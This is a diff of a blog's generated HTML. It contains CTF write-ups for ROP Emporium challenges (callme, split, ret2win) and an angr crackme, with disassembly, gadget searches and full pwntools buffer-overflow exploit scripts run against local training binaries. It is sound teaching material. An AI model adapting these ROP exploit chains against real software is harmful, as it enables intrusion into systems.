+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">0x00001100 lea rdi, str.FAILURE ; 0x2018 ; const char *s
 0x00001107 mov r12d, &lt;span style="color:#ae81ff">1&lt;/span>
 0x0000110d call puts ; sym.imp.puts ; int puts&lt;span style="color:#f92672">(&lt;/span>const char *s&lt;span style="color:#f92672">)&lt;/span>
 0x00001112 add rsp, 0x28
@@ -709,7 +709,7 @@ puts(&lt;span style="color:#e6db74">&amp;#34;FAILURE&amp;#34;&lt;/span>);
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>FAILURE = 0x00001100&lt;/code>&lt;/p>
 &lt;p>&lt;code>success = 0x0000111d&lt;/code>&lt;/p>
 &lt;h1 id="solution">Solution&lt;/h1>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
 &lt;span style="color:#f92672">import&lt;/span> angr
 &lt;span style="color:#f92672">import&lt;/span> claripy
 &lt;span style="color:#f92672">import&lt;/span> sys
@@ -732,11 +732,11 @@ s &lt;span style="color:#f92672">=&lt;/span> []
 &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;SUCCESS&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> j&lt;span style="color:#f92672">.&lt;/span>posix&lt;span style="color:#f92672">.&lt;/span>dumps(&lt;span style="color:#ae81ff">1&lt;/span>):
 s&lt;span style="color:#f92672">.&lt;/span>append(j)
 valid &lt;span style="color:#f92672">=&lt;/span> s[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>posix&lt;span style="color:#f92672">.&lt;/span>dumps(&lt;span style="color:#ae81ff">0&lt;/span>)
-&lt;span style="color:#66d9ef">print&lt;/span>(valid&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>))
+print(valid&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>))
 &lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
 main(sys&lt;span style="color:#f92672">.&lt;/span>argv)
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>After running our solution script we captured our flag 🚩&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">angr ➤ python solve.py ./a.out
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">angr ➤ python solve.py ./a.out
 WARNING | 2020-09-09 08:36:15,359 | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.
 WARNING | 2020-09-09 08:36:17,016 | angr.state_plugins.symbolic_memory | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.
 WARNING | 2020-09-09 08:36:17,016 | angr.state_plugins.symbolic_memory | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
@@ -758,7 +758,7 @@ You must call the callme_one(), callme_two() and callme_three() functions in tha
 &lt;p>The challenge files can be found here ~&amp;gt;
 &lt;a href="https://ropemporium.com/challenge/callme.html">callme&lt;/a>&lt;/p>
 &lt;p>Before getting our hands onto the challenge let&amp;rsquo;s take a look at x86-64 calling conventions&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">+---------+------+------+------+------+------+------+
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">+---------+------+------+------+------+------+------+
 | syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
 +---------+------+------+------+------+------+------+
 | %rax | %rdi | %rsi | %rdx | %r10 | %r8 | %r9 |
@@ -766,7 +766,7 @@ You must call the callme_one(), callme_two() and callme_three() functions in tha
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>To understand calling conventions better take a look here ~&amp;gt;
 &lt;a href="https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI">calling convetions&lt;/a>&lt;/p>
 &lt;p>Now lets take a look at the challenge binary&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ checksec callme
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ checksec callme
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/2-callme/callme64/callme&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -776,7 +776,7 @@ PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="co
 RUNPATH: b&lt;span style="color:#e6db74">&amp;#39;.&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>This looks similar to the previous challenge we solved&lt;/p>
 &lt;p>Lets checkout the functions which are imported from the shared object file&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ rabin2 -i callme
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ rabin2 -i callme
 &lt;span style="color:#f92672">[&lt;/span>Imports&lt;span style="color:#f92672">]&lt;/span>
 nth vaddr bind type lib name
 ―――――――――――――――――――――――――――――――――――――
@@ -793,7 +793,7 @@ nth vaddr bind type lib name
 &lt;span style="color:#ae81ff">11&lt;/span> 0x00400750 GLOBAL FUNC exit
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Yes we can see the functions which are need for the exploit let&amp;rsquo;s take a note of them&amp;hellip;..&lt;/p>
 &lt;p>Next up let&amp;rsquo;s check the functions present in the binary&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
 0x00400760 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> entry0
 0x004006a8 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
 0x004009b4 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> sym._fini
@@ -817,7 +817,7 @@ nth vaddr bind type lib name
 0x00400847 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">81&lt;/span> main
 0x00400730 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Again we have a useful function lets take a look at it&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
 &lt;span style="color:#f92672">[&lt;/span>0x004008f2&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
 ┌ 74: sym.usefulFunction &lt;span style="color:#f92672">()&lt;/span>;
 │ 0x004008f2 push rbp
@@ -838,7 +838,7 @@ nth vaddr bind type lib name
 └ 0x00400937 call sym.imp.exit ; void exit&lt;span style="color:#f92672">(&lt;/span>int status&lt;span style="color:#f92672">)&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>From this we can understand we need to pass the values three times and call the functions respectively and
 as per the important note given by the challenge author we can figure out the overview of solving the challenge&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
 mov rdi, 0xdeadbeefdeadbeef
 mov rsi, 0xcafebabecafebabe
 mov rdx, 0xd00df00dd00df00d
@@ -857,7 +857,7 @@ call callme_three
 &lt;/code>&lt;/pre>
 &lt;p>To get the values into registers to pass the arguments, we’ll need a gadget that will pop values from the stack into these registers.
 Lets checkout the gadgets now using &lt;code>ropper&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ ropper --file callme --search &lt;span style="color:#e6db74">&amp;#39;pop&amp;#39;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ ropper --file callme --search &lt;span style="color:#e6db74">&amp;#39;pop&amp;#39;&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Load gadgets from cache
 &lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> loading... 100%
 &lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> removing double gadgets... 100%
@@ -880,11 +880,11 @@ Lets checkout the gadgets now using &lt;code>ropper&lt;/code>&lt;/p>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>we have a gadget that satisfies our exact need lets take a note of it &lt;code>0x000000000040093c&lt;/code>&lt;/p>
 &lt;h2 id="exploitation">Exploitation&lt;/h2>
 &lt;p>Now lets craft our exploit :)&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
-exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>False)
+exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
 io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
 gadget &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040093c&lt;/span> &lt;span style="color:#75715e">#pop rdi; pop rsi; pop rdx; ret&lt;/span>
 one &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>
@@ -899,7 +899,7 @@ gadget, one, two, three, exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;sp
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets run our exploit to check if it works&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ python xpl.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ python xpl.py
 &lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">8013&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
 callme by ROP Emporium
@@ -920,7 +920,7 @@ This challenge is slighty different from the previous challenge as the descripti
 &lt;a href="https://ropemporium.com/challenge/split.html">split&lt;/a>&lt;/p>
 &lt;p>This challenge is slighty different from the previous challenge as the description says all elements are still present they&amp;rsquo;ve just been split apart so we&amp;rsquo;ll recombine them now :)&lt;/p>
 &lt;p>lets check the binary&amp;rsquo;s mitigation and from the previous challenge we know we need 40 bytes to overflow .&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ checksec split
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ checksec split
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/1-split/split64/split&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -930,7 +930,7 @@ PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="co
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>This looks similar to ret2win and we see nx is enabled so we cant use shellcode to spawn a shell.
 So for this challenge the two elements that we need are a &lt;code>/bin/cat flag.txt&lt;/code> and call to &lt;code>system() function&lt;/code>&lt;/p>
 &lt;p>Let&amp;rsquo;s check out the if the cat flag string is present in the binary&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ rabin2 -z split
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ rabin2 -z split
 &lt;span style="color:#f92672">[&lt;/span>Strings&lt;span style="color:#f92672">]&lt;/span>
 nth paddr vaddr len size section type string
 ―――――――――――――――――――――――――――――――――――――――――――――――――――――――
@@ -944,7 +944,7 @@ nth paddr vaddr len size section type string
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Yes we can see our cat flag string present,
 the addr of our cat flag string is &lt;code>0x00601060&lt;/code>&lt;/p>
 &lt;p>Next up we need our system function lets look at some funcitons using radare2.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
 0x004005b0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> entry0
 0x004005f0 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">37&lt;/span> sym.deregister_tm_clones
 0x00400620 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">55&lt;/span> sym.register_tm_clones
@@ -965,7 +965,7 @@ the addr of our cat flag string is &lt;code>0x00601060&lt;/code>&lt;/p>
 0x004005a0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
 0x00400528 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Everything seems normal but we can see there&amp;rsquo;s a useful function lets take a look at it&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
 &lt;span style="color:#f92672">[&lt;/span>0x00400742&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
 ┌ 17: sym.usefulFunction &lt;span style="color:#f92672">()&lt;/span>;
 │ 0x00400742 push rbp
@@ -980,7 +980,7 @@ let&amp;rsquo;s take a note at the address of it &lt;code>0x0040074b&lt;/code>.
 Great we&amp;rsquo;ve found the two elements now we just need to find the right gadget.
 But what gadget are we looking for, we&amp;rsquo;re looking for a pop rdi gadget so we can store the string into rdi register and call system so we can cat out flag .&lt;/p>
 &lt;p>Now we&amp;rsquo;ll use ropper to find the gagdget.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
 split64 ➤ ropper --file split --search &lt;span style="color:#e6db74">&amp;#34;pop rdi&amp;#34;&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Load gadgets from cache
 &lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> loading... 100%
@@ -990,11 +990,11 @@ split64 ➤ ropper --file split --search &lt;span style="color:#e6db74">&amp;#34
 0x00000000004007c3: pop rdi; ret;
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploitation">Exploitation&lt;/h2>
 &lt;p>Combining what we&amp;rsquo;re gonna do.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
 gadget
 cat_flag string
 call_system by returning into it
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 io &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#34;./split&amp;#34;&lt;/span>)
 padding &lt;span style="color:#f92672">=&lt;/span> cyclic(&lt;span style="color:#ae81ff">40&lt;/span>) &lt;span style="color:#75715e"># 40 bytes to overflow&lt;/span>
@@ -1006,7 +1006,7 @@ payload &lt;span style="color:#f92672">+=&lt;/span> gadget &lt;span style="color
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s run the exploit to check if it works&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ python xpl.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ python xpl.py
 &lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;./split&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">15817&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
 split by ROP Emporium
@@ -1021,7 +1021,7 @@ In this technique, an attacker gains control of the call stack to hijack program
 &lt;p>Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.&lt;/p>
 &lt;p>In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine&amp;rsquo;s memory, called &amp;ldquo;gadgets&amp;rdquo;. Each gadget typically ends in a return instruction and is located in a subroutine within the existing program and/or shared library code. Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks.&lt;/p>
 &lt;h2 id="the-tools-i-use">The tools i use&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">pwntools
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">pwntools
 pwndbg&lt;span style="color:#f92672">/&lt;/span>gef
 ropper&lt;span style="color:#f92672">/&lt;/span>ROPgadget
 radare2
@@ -1061,7 +1061,7 @@ check this article
 &lt;img src="https://ctf101.org/binary-exploitation/what-is-binary-security/" alt="binary-mitigation">&lt;/p>
 &lt;h2 id="exploitation">Exploitation&lt;/h2>
 &lt;p>Now lets checkout the functions and disassembly using radare2&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ r2 -AAA ret2win
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ r2 -AAA ret2win
 &lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze all flags starting with sym. and entry0 &lt;span style="color:#f92672">(&lt;/span>aa&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze &lt;span style="color:#66d9ef">function&lt;/span> calls &lt;span style="color:#f92672">(&lt;/span>aac&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze len bytes of instructions &lt;span style="color:#66d9ef">for&lt;/span> references &lt;span style="color:#f92672">(&lt;/span>aar&lt;span style="color:#f92672">)&lt;/span>
@@ -1093,7 +1093,7 @@ check this article
 0x004005a0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
 0x00400528 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now lets take a look at he main function to see what happens in there&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s main
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s main
 &lt;span style="color:#f92672">[&lt;/span>0x00400697&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
 ; DATA XREF from entry0 @ 0x4005cd
 ┌ 81: int main &lt;span style="color:#f92672">(&lt;/span>int argc, char **argv, char **envp&lt;span style="color:#f92672">)&lt;/span>;
@@ -1120,7 +1120,7 @@ check this article
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The main function just prints the output we saw when we ran the binary and its calls a function named pwnme
 we know the pwnme function contains the vulnerable gets fucntions which we need to overflow&lt;/p>
 &lt;p>let&amp;rsquo;s checkout ret2win fucntion to see what it does&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400756&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400756&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
 ┌ 27: sym.ret2win &lt;span style="color:#f92672">()&lt;/span>;
 │ 0x00400756 &lt;span style="color:#ae81ff">55&lt;/span> push rbp
 │ 0x00400757 4889e5 mov rbp, rsp
@@ -1147,7 +1147,7 @@ You there, may I have your input please? And don't worry about null bytes, we're
 Thank you!
 [1] 34640 segmentation fault (core dumped) ./ret2win
 &lt;/code>&lt;/pre>&lt;p>Now on passing the pattern we get a segfault let&amp;rsquo;s do the same with pwndbg&lt;/p>
